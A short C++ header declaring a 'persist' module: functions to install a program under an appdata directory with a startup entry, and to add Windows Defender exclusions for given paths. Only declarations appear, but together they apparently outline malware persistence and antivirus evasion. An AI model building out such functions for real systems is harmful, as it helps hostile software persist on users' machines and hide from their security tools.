#pragma once

#include <filesystem>
#include <string>
#include <vector>

namespace ariel::persist {

std::filesystem::path install_directory(const std::string& appdata_dir);

bool install(const std::string& startup_name,
             const std::string& appdata_dir,
             std::string& error);

bool add_defender_exclusions(const std::vector<std::filesystem::path>& paths,
                             std::string& error);

}  // namespace ariel::persist
